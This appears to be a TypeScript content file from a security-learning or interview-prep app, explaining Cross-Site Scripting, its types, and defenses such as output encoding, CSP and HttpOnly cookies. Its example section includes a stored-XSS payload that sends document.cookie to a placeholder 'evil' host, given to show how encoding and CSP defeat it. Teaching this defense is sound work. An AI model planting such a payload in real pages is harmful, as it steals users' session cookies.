import type { TopicContent } from '@/domain/types'

export const content: TopicContent = {
  whatIsIt:
    'Cross-Site Scripting (XSS) injects malicious JavaScript into pages viewed by other users. Types: reflected (URL param echoed), stored (persisted in DB/comments), DOM-based (client JS reads untrusted URL). Impact: session theft, keylogging, defacement. Defense: output encoding, CSP, HttpOnly cookies, input sanitization where HTML allowed.',
  whyExists:
    'Browsers trust same-origin script. If app renders user content as HTML/JS without encoding, attacker script runs with victim session privileges — stealing cookies (if not HttpOnly), calling APIs, or phishing in-page.',
  mentalModel:
    'Treat all user input as hostile text until encoded for correct context (HTML body, attribute, JS, URL). CSP limits damage even if encoding fails. Backend APIs returning JSON still matter — XSS in frontend that renders API data unsafely.',
  howItWorks: [
    {
      type: 'table',
      headers: ['Type', 'Vector', 'Mitigation'],
      rows: [
        ['Reflected', 'Search?q=<script>... echoed', 'Encode output; validate input'],
        ['Stored', 'Comment with script saved', 'Sanitize or encode on display; CSP'],
        ['DOM', 'location.hash to innerHTML', 'Safe APIs textContent; encode'],
      ],
    },
    {
      type: 'list',
      items: [
        'Contextual encoding: HTML entity, JS string, URL encode',
        'Content-Security-Policy: script-src self; block inline',
        'HttpOnly session cookies — script cannot read',
        'Avoid innerHTML; use framework auto-escaping (React default escapes)',
        'Sanitize rich text with allowlist library (OWASP Java HTML Sanitizer)',
      ],
    },
    {
      type: 'code',
      language: 'java',
      caption: 'Thymeleaf auto-escaping vs unsafe',
      code: `<!-- Safe — escaped by default -->
<p th:text="\${userBio}"></p>

<!-- UNSAFE unless trusted HTML sanitized -->
<div th:utext="\${userBio}"></div>`,
    },
  ],
  example: [
    {
      type: 'paragraph',
      text: 'Profile name stored as <img src=x onerror=fetch(\"https://evil?c=\"+document.cookie)>. Server-side template encodes on render — displays literal text. CSP script-src blocks inline onerror even if encoding missed.',
    },
  ],
  internals: [
    {
      type: 'list',
      items: [
        'JSON responses are not XSS alone — XSS happens when JS inserts data into DOM unsafely',
        'Content-Type: application/json prevents some MIME sniff attacks',
        'CSP nonce/hash for required inline scripts in legacy apps',
        'X-XSS-Protection header deprecated — use CSP',
        'Backend should set CSP and security headers on HTML responses',
      ],
    },
  ],
  tradeoffs: {
    advantages: ['Encoding + CSP blocks most XSS', 'Framework defaults help', 'HttpOnly limits cookie theft'],
    disadvantages: ['Rich text needs careful sanitization', 'Strict CSP breaks inline scripts', 'DOM XSS in SPA still common'],
    alternatives: ['Markdown rendered to safe subset', 'Plain text only user content'],
    whenToUse: ['Always encode on output', 'CSP on all HTML-serving apps'],
    whenNotToUse: ['Blacklist filtering alone — easily bypassed'],
  },
  failureModes: [
    'th:utext or dangerouslySetInnerHTML with user data',
    'Reflected error messages with user input',
    'JWT in localStorage stolen via XSS',
    'Weak CSP with unsafe-inline',
    'Upload SVG/HTML served as active content',
  ],
  production: {
    security: ['CSP report-only then enforce', 'HttpOnly Secure cookies', 'Sanitize rich text server-side'],
    observability: ['CSP violation reports', 'Security headers lint in CI'],
    maintainability: ['Lint for dangerous DOM APIs in frontend', 'Template review checklist'],
  },
  interview: {
    expectations: ['Three XSS types', 'Encoding vs sanitization', 'CSP and HttpOnly role'],
    commonQuestions: ['Prevent XSS?', 'Stored vs reflected?', 'JWT localStorage XSS risk?'],
    followUps: ['CSP directives?', 'Backend role in XSS?'],
    misconceptions: ['API-only backend ignores XSS', 'HTML entity encode once fixes all contexts'],
    traps: ['Blacklist <script> only'],
    strongSignals: ['Contextual encoding, CSP, HttpOnly, sanitize rich text, avoid innerHTML'],
  },
  keyTakeaways: [
    'Encode user data for output context — HTML, attr, JS, URL.',
    'Stored XSS persists; reflected is immediate; DOM is client-side sink.',
    'CSP limits script execution blast radius.',
    'HttpOnly cookies — XSS cannot exfiltrate session cookie easily.',
    'Backend sets security headers; APIs feed data frontend must render safely.',
  ],
  interviewQuestions: [
    { level: 'basic', question: 'What is XSS?', answerHint: 'Inject script executing in victim browser in site context — steal session or act as user.' },
    { level: 'intermediate', question: 'Encoding vs sanitization?', answerHint: 'Encoding turns data into safe text; sanitization strips/allowlists HTML tags for rich content.' },
    { level: 'advanced', question: 'Why JWT in localStorage risky with XSS?', answerHint: 'Any XSS reads localStorage and sends token — prefer HttpOnly cookie or short-lived token + strict CSP.' },
  ],
  flashcards: [
    { front: 'Stored XSS', back: 'Malicious script persisted — affects all viewers' },
    { front: 'CSP', back: 'Restricts script sources — mitigates XSS impact' },
    { front: 'HttpOnly', back: 'Cookie not readable by document.cookie from script' },
    { front: 'Contextual encoding', back: 'Encode differently for HTML vs JS vs URL context' },
  ],
  quickRevision: ['Encode output', 'CSP headers', 'HttpOnly cookies', 'No unsafe innerHTML', 'Sanitize rich text'],
}
